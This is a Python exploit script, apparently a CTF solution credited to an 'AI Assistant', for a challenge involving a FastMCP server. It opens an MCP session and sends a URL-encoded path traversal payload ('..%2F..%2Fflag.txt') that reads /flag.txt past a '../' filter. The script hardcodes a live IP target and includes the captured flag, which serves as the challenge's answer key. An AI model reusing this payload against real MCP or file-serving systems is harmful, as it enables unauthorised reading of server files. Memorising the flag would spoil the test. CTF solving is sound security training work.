#!/usr/bin/env python3
"""
Markov Scrolls - URL-Encoded Path Traversal Exploit
Challenge: Neurogrid CTF 2025
Category: AI/LLM, MCP Security
Difficulty: Very Easy
Points: 925

Solution: URL-encoded path traversal to read /flag.txt
The server blocked "../" but didn't decode "%2F" before validation.

Author: AI Assistant
Date: 2025-11-21
Flag: HTB{tr4v3r53d_th3_thr34d_0f_f4t3_0v3r_mcP}
"""
import requests
import json
import sys

def exploit(mcp_url):
    """
    Exploits URL-encoded path traversal in FastMCP server.

    Args:
        mcp_url: The MCP endpoint URL (e.g., http://host:port/mcp)

    Returns:
        The flag content if successful, None otherwise
    """
    session_id = None

    def send_mcp(method, params=None):
        nonlocal session_id
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream",
        }
        if session_id:
            headers["mcp-session-id"] = session_id

        payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or {}}
        response = requests.post(mcp_url, headers=headers, json=payload, stream=True)

        if not session_id and 'mcp-session-id' in response.headers:
            session_id = response.headers['mcp-session-id']

        for line in response.iter_lines():
            if line:
                line_str = line.decode('utf-8')
                if line_str.startswith('data: '):
                    return json.loads(line_str[6:])
        return None

    # Initialize MCP session
    print("[*] Initializing MCP session...")
    send_mcp("initialize", {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {"name": "exploit", "version": "1.0"}
    })
    print(f"[+] Session ID: {session_id}")

    # Exploit: URL-encoded path traversal
    # %2F = URL-encoded /
    # file://scrolls/..%2F..%2Fflag.txt decodes to file://scrolls/../../flag.txt
    print("\n[*] Exploiting URL-encoded path traversal...")
    print("    URI: file://scrolls/..%2F..%2Fflag.txt")
    print("    Decoded: file://scrolls/../../flag.txt")

    response = send_mcp("resources/read", {"uri": "file://scrolls/..%2F..%2Fflag.txt"})

    if response and "result" in response:
        flag = response["result"]["contents"][0]["text"]
        print(f"\n{'='*70}")
        print("FLAG CAPTURED!")
        print(f"{'='*70}")
        print(flag)
        print(f"{'='*70}")
        return flag
    else:
        print("[-] Exploit failed:", response)
        return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        mcp_url = sys.argv[1]
    else:
        # Default to current instance
        mcp_url = "http://154.57.164.71:32731/mcp"

    print(f"[*] Targeting: {mcp_url}\n")
    exploit(mcp_url)
